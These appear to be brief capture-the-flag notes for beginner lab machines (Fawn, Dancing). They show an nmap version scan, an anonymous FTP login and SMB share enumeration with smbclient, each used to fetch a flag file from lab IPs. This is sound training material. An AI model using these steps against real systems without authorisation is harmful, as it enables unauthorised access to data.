# Meow

# Fawn

## Task 1:What does the 3-letter acronym FTP stand for? 

File Transfer Protocol

##  Task 5 :From your scans, what version is FTP running on the target? 

use ``` nmap -sV -P 21 10.129.204.114```

```bash
└─$ ftp 10.129.204.114
Connected to 10.129.204.114.
220 (vsFTPd 3.0.3)
Name (10.129.204.114:druidc): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
```



# Dancing

```bas
smbclient -L 10.129.91.241                  1 ⨯ 1 ⚙
Enter WORKGROUP\druidc's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
SMB1 disabled -- no workgroup available


smbclient //10.129.1.12/WorkShares  

smb: \James.P\> get flag.txt 

```

